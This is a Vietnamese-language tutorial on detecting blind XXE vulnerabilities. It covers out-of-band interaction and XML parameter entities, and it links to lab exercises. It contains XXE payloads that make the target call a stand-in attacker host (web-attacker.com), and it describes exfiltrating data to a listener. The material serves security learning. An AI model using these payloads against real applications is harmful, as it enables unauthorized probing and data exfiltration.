# Overview:

Lỗ hổng XXE mù (Blind XXE) xảy ra khi ứng dụng bị tổn thương bởi XXE injection nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào trong phản hồi. Điều này làm cho việc khai thác blind XXE khó khăn hơn so với các lỗ hổng XXE thông thường.

Để tìm và khai thác các lỗ hổng blind XXE, bạn có thể sử dụng các phương pháp sau:

1. Kích hoạt tương tác mạng ngoài phạm vi: Bạn có thể tạo ra các yêu cầu mạng tới các hệ thống bên ngoài mà ứng dụng có thể truy cập. Đồng thời, bạn cần tạo ra một cơ chế để thu thập thông tin hoặc dữ liệu nhạy cảm từ các yêu cầu này. Ví dụ, bạn có thể thiết lập một máy chủ nghe (listener) để nhận dữ liệu exfiltrated từ ứng dụng.

2. Kích hoạt lỗi phân tích XML để thu thập thông tin nhạy cảm: Bạn có thể thử gây ra lỗi phân tích XML bằng cách đưa vào các dữ liệu không hợp lệ hoặc gây ra xung đột trong cú pháp XML. Sau đó, bạn sẽ kiểm tra các thông báo lỗi hoặc thông báo phản hồi từ ứng dụng để tìm thông tin nhạy cảm như đường dẫn tệp, tên người dùng, hoặc thông tin hệ thống khác.

# Phát hiện lỗ hổng blind XXE bằng cách sử dụng kỹ thuật out-of-band (OAST):

Bạn có thể phát hiện lỗ hổng blind XXE bằng cách sử dụng kỹ thuật out-of-band (OAST) giống như cho các cuộc tấn công XXE SSRF, nhưng kích hoạt tương tác mạng ngoài phạm vi đến một hệ thống mà bạn kiểm soát. Ví dụ, bạn sẽ xác định một thực thể bên ngoài như sau:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Thông qua việc xác định thực thể bên ngoài này, bạn có thể tạo ra các yêu cầu HTTP hoặc DNS đến hệ thống mà bạn kiểm soát. Bằng cách theo dõi các yêu cầu đến hệ thống của bạn, bạn có thể xác định thông tin nhạy cảm hoặc thu thập dữ liệu từ ứng dụng mục tiêu.

Thực hành ở đây.

Đôi khi, các cuộc tấn công XXE sử dụng các thực thể thông thường bị chặn do việc kiểm tra đầu vào bởi ứng dụng hoặc việc tăng cường bảo mật của trình phân tích cú pháp XML đang được sử dụng. Trong tình huống này, bạn có thể sử dụng thực thể XML thông số thay thế. Thực thể XML thông số là một loại đặc biệt của thực thể XML chỉ có thể được tham chiếu ở nơi khác trong DTD. Đối với mục đích hiện tại, bạn chỉ cần biết hai điều. Thứ nhất, khai báo một thực thể XML thông số bao gồm ký tự phần trăm trước tên enitity:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```
và

```xml
%myparameterentity;
```
Điều này có nghĩa là bạn có thể kiểm tra các lỗ hổng XXE mù bằng cách sử dụng phát hiện ngoài dòng thông qua các thực thể XML thông số như sau:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Thực hành [ở đây](Exercises/Lab: Blind XXE with out-of-band interaction via XML parameter entities.md).

